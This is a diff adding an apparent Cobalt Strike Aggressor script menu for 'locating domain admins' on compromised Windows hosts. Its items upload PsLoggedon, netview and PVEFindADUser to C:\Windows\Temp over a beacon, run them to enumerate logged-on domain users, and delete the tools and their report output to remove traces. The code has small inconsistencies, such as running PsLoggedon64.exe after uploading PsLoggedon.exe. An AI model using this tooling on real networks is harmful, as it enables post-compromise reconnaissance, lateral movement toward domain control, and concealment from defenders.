@@ -1,0 +1,70 @@
+menu "定位域管" {
+  menu "PsLoggedon" {
+    item "上传PsLoggedon" {
+      $bid = $1;
+      $dialog = dialog("上传 PsLoggedon", %(UploadPath => "C:\\Windows\\Temp\\", bid => $bid), &PsLoggedon);
+      dialog_description($dialog, "微软官方工具，该工具的某些功能需要管理员权限。项目地址：https://docs.microsoft.com/zh-cn/sysinternals/downloads/psloggedon");
+      drow_text($dialog, "UploadPath",  "上传路径: ");
+      dbutton_action($dialog, "上传");
+      dialog_show($dialog);
+    }
+    sub PsLoggedon{
+      bcd($bid, $3['UploadPath']);
+			if (-is64 $bid['id']) {
+				bupload($bid, script_resource("/scripts/Locate AD/x64/PsLoggedon.exe"));
+			}else{
+				bupload($bid, script_resource("/scripts/Locate AD/x86/PsLoggedon.exe"));
+			}
+    }
+    item "运行PsLoggedon"{
+      bshell($bid, "PsLoggedon64.exe");
+    }
+    item "删除PsLoggedon"{
+      local('$bid');
+      foreach $bid ($1){
+        bshell($1, "del /f /s /q PsLoggedon.exe");
+      }
+    }
+  }
+
+  item "PVEFindADUser" {
+    bexecute_assembly($1, script_resource("/scripts/Locate AD/PVEFindADUser.exe"),"-current");
+    bshell($1, "del /f /s /q report.csv");
+  }
+
+  menu "netview" {
+    item "上传netview" {
+      $bid = $1;
+      $dialog = dialog("上传netview", %(UploadPath => "C:\\Windows\\Temp\\", bid => $bid), &netview);
+      dialog_description($dialog, "绝大部分功能不需要管理员权限。项目地址：https://github.com/mubix/netview");
+      drow_text($dialog, "UploadPath",  "上传路径: ");
+      dbutton_action($dialog, "上传");
+      dialog_show($dialog);
+    }
+    sub netview {
+      bcd($bid, $3['UploadPath']);
+      bupload($bid, script_resource("/scripts/Locate AD/netview.exe"));
+    }
+    item "运行netview"{
+      $bid = $1['@'];
+      $Dialog = dialog("运行netview",%(domain => "xxx.com",bid => $bid),&netview_run);
+      drow_text($Dialog, "domain", "domain: ");
+      dbutton_action($Dialog, "运行");
+      dialog_show($Dialog);
+    }
+    sub netview_run{
+      local('$Name');
+      $Name = $3['domain'];
+      bshell($bid, "netview.exe   $+ $Name");
+    }
+    item "删除netview"{
+      local('$bid');
+      foreach $bid ($1){
+        bshell($1, "del /f /s /q netview.exe");
+      }
+    }
+  }
+
+
+
+}
